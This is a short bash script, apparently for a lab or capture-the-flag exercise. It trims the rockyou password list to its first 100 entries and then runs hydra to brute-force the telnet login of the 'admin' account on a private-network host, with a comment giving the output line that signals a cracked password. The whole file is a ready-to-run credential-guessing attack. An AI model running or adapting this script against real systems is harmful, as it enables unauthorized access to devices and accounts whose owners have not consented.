#/bin/bash
gzip -d /usr/share/wordlists/rockyou.txt.gz
head -n 100 /usr/share/wordlists/rockyou.txt > /usr/share/wordlists/rockyou_min.txt
hydra -l admin -P /usr/share/wordlists/rockyou_min.txt -v -V 192.168.100.2 telnet
# telnet -4 -l admin 192.168.100.1 23

# success = "1 valid password found"
